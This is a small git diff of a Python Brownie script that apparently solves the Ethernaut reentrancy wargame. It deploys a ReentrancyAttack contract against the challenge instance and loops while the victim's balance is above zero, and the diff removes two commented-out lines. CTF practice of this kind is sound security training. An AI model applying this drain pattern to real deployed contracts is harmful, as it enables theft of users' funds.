@@ -10,9 +10,7 @@ from brownie import Reentrance, ReentrancyAttack, accounts
 def solve_challenge():
     # load challenge
     reentrancy = load_challenge(contract_name=Reentrance, instance_key='reentrancy')
-    # reentrancy = Reentrance.deploy({'from':accounts[0]})
     reentrancyattack = ReentrancyAttack.deploy(EthernautInstances['reentrancy'], _from)
-    # reentrancyattack = ReentrancyAttack.deploy(reentrancy.address, _from)
 
     # run the loop
     while reentrancy.balance() > 0:
